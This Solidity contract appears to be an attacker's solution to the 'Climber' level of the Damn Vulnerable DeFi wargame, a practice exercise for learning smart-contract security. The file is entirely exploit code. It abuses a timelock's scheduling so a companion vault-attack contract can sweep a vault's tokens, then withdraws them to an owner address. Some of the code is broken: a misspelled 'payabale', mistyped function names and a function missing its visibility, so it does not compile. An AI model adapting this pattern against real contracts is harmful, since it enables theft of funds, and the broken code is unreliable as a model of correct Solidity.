// SPDX-License-Identifier: MIT
pragma solidity 0.8.15;

import "./AttackVault.sol";
import "../../climber/ClimberTimelock.sol";
import "../../DamnValuableToken.sol";

contract AttackTimelock {
    address payable timelock;
    address token;
    address vault;
    address owner;
    address[] public to;
    bytes[] public scheduleData;

    constructor(address _vault, address payabale _timelock, address _token, address _owner) {
        timelock = _timelock;
        token = _token;
        vault = _vault;
        owner = _owner;
    }

    function setScheduleData(address[] memory _to, bytes[] memory data) external {
        to = _to;
        scheduleData = data;
    }

    function hack() external {
        uint256[] memory emptyData = new uint256[](to.length);
        ClimberTimelock(timelock).schedule(to, emptyData, scheduleData, 0);

        AttackVault(vault).setSweeperZ(address(this));
        AttackVault(vault).sweetFunds(token);
    }

    function withdraw(){
        DamnValuableToken(token).transfer(owner, DamnValuableToken(token).balanceOf(address(this)));
    }
}
